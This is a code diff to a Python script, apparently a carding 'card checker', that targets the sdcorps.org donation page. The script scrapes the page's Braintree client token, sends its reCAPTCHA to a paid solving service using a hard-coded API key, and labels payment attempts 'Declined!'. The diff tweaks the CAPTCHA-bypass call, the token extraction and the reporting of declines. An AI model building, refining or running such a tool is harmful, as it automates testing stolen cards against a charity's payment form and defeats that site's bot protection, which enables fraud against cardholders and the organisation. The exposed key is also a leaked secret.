@@ -21,7 +21,8 @@ CAPTCHAAI_KEY = 'okrzovimon1mv5kkiviljc5ml9dok0cw'
 
 def solve_captcha(site_key, site_url, invisible=True):
     try:
-        # Using ocr.captchaai.com as it's the only working endpoint for this key
+        # Step 1: Submit Task using Task API (more robust for invisible)
+        # Using both normal and invisible docs
         in_url = "https://ocr.captchaai.com/in.php"
         data = {
             "key": CAPTCHAAI_KEY,
@@ -31,7 +32,7 @@ def solve_captcha(site_key, site_url, invisible=True):
             "invisible": 1,
             "json": 1
         }
-        print(f"Submitting task to CaptchaAI OCR (Invisible: 1)...")
+        print(f"Submitting task to CaptchaAI OCR (Invisible: {invisible})...")
         res = requests.post(in_url, data=data, timeout=30)
         resp = res.json()
         
@@ -73,6 +74,7 @@ def solve_captcha(site_key, site_url, invisible=True):
 
 def solve_math(text):
     try:
+        # Improved math solver to handle multiple formats
         match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)', text)
         if match:
             num1 = int(match.group(1))
@@ -130,10 +132,6 @@ class sdcorps_checker:
                 token_match = re.search(r"authorization:\s*'([^']+)'", resp)
             
             if not token_match:
-                # Try to find anywhere in the page
-                token_match = re.search(r'client_token":"([^"]+)"', resp)
-            
-            if not token_match:
                 return "Error", "Braintree client token not found"
             
             token = token_match.group(1).replace('\\', '')
@@ -143,10 +141,12 @@ class sdcorps_checker:
             except:
                 bearer = token
 
-            # 3. Solve Captcha (Invisible support)
+            # 3. Solve Captcha (Trying normal first, then invisible)
             site_key = paserX(resp, 'data-sitekey="', '"') or "6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY"
-            is_invisible = 'invisible' in resp.lower() or 'data-size="invisible"' in resp.lower()
+            
+            # Solve Invisible Captcha
             cap = solve_captcha(site_key, 'https://sdcorps.org/campaigns/support/', invisible=True)
+            
             if not cap:
                 return "Error", "Captcha bypass failed"
 
@@ -227,10 +227,10 @@ class sdcorps_checker:
                 errors = data.get('errors', [])
                 if errors:
                     msg = errors[0].get('message', 'Declined')
-                elif 'message' in data:
+                elif isinstance(data, dict) and 'message' in data:
                     msg = data.get('message')
                 else:
-                    msg = final_resp.get('data', 'Declined')
+                    msg = str(data)
                 return "Declined! ❌", str(msg)
 
         except Exception as e:
